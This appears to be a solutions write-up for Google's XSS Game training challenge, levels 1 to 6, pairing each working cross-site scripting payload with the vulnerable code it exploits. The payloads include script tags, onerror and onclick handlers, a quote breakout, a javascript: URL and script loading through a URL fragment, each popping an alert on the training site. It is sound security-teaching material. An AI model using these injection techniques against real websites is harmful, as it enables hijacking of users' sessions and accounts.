# Solutions to Google XSS Challenges

## Level 1

### How to trigger the vulnerability?
```html
<script>alert()</script>
```

### Where is the vulnerable code?
In [level1.py](source-code/level-1.py), the input strings are directly being rendered without any escaping or validation.

```python
message = "Sorry, no results were found for <b>" + query + "</b>."

self.render_string(page_header + message + page_footer)

def render_string(self, s):
    self.response.out.write(s)
```

## Level 2

### How to inject Javascript code?
Since simply using `<script>...</script>` will not work in this case, we need to find other ways to inject Javascript code.

Some options:

```html
<a href="#" onclick="alert()">Click Me To Exploit!</a>
```

```html
<img src="hahaa" onerror="alert()">
```

### Analysis

Any content of post is displayed without escaping. Therefore, we can use "onclick" or "onerror" to execut a script.

## Level 3

### How to exploit?
In this level I've come up with two ways to exploit the xss vulnerabilities.

First, modify the URL such that the image will not be displayed and thus trigger the `onerror` event which we injected.
```url
https://xss-game.appspot.com/level3/frame#4' onerror="alert()" alt='exploited_image
```
An alternative solution will be the web page as normal render the correct image (for example, 3.jpg), but this time we add the `onClick` event into the image. So the injected JS code will be triggered when the user click that correctly displayed image.
```url
https://xss-game.appspot.com/level3/frame#1.jpg' onClick="alert()" alt='will_not_display
```


### Vulnerable Code

The vulnerable code appears at Line17 of [index.html](/source_code/level-3/index.html) file. This allows attacker to inject Javascript code using `onerror` event in the `img` tag.
```html
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```

After injecting the above url, the `img` tag of the html file will be rendered as
```html
<img src='/static/level3/cloud/4' onerror="alert()" alt='exploited_image.jpg' />
```
---
#### *NOTICE*:
The image is stored inside the database as `1.jpg`. So if you modify the image tag as
```html
<img src='/static/level3/cloud/1.jpg' onerror="alert()" alt='will_not_display.jpg' />
```
will NOT trigger the `onerror` event.

Just delete the `.jpg` extension will make the image un-displayable and thus trigger the `onerror` event :)

## Level 4

### How to exploit?
Input the following weird string to become the timer!
```
3');alert('
```

### Analysis
In this case, the vulnerable code locates at line 21 of the  [timer.html](/source_code/level-3/timer.html) file.

```html
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
```

With proper numerical input, the `onload` event execute the function `startTimer('3');` without any problem. In this case, `3` is the type of string, and will eventually be parsed as integer (`parseInt`) in the startTimer function.

Thus, we can utilize the `onload` event to add additional javascript code! If our input is OUR_INPUT_STRING, the `startTimer` function will look like this:
```js
onload="startTimer('OUR_INPUT_STRING')"
```

If we intentionally set our input to be `3');`, some magical things then happen! We have manually escaped the startTimer function! In this case, the onload event looks like this:
```js
// I intentionally make a space after the `;` of startTimer function. Just to make things clearer :)
onload="startTimer('3'); ')"
```
The remaining `');'` is "auto-filled" by the program, so the remaining thing we need to do is to add `alert('` after our above-mentioned tricky string. Now we have successfully injected the javascript code into the web page!

The **injected** `onload` event will become like this:
```js
onload="startTimer('3');alert('')"
```

## Level 5

### How to exploit?
```html
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('')
```

In the `signup` page, change the value of the `next` parameter in the URL. Use `javascipt:alert()` instead of "confirm"!

So the URL for our exploitation will become
```html
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()
```

*NOTICE*: After you forge the URL in this case, you need to **click the GO button first**, then entering your mail and clicking the Next button. Only in this case will make that forged URL valid. After that, enjoy the result javascript alert popping up :)

### Analysis

After changing the content of "next" parameter, behavior of the next button will be modified, which is defined in line 15 of signup.html:
```html
<a href="{{ next }}">Next >></a>
```

Javascript code inserted in the parameter will be executed after clicking the next button.

## Level 6

### Exploit Code

```html
https://xss-game.appspot.com/level6/frame#//www.google.com/jsapi?callback=alert
```

Another way to work...
```html
https://xss-game.appspot.com/level6/frame#data:text/javascript,alert('')
```

### Analysis

Function includeGadget(url) prevents client from loading a 'http' url, but leaves other data formats unchecked. We can load a text which contains javascript code, or a url without 'http'.
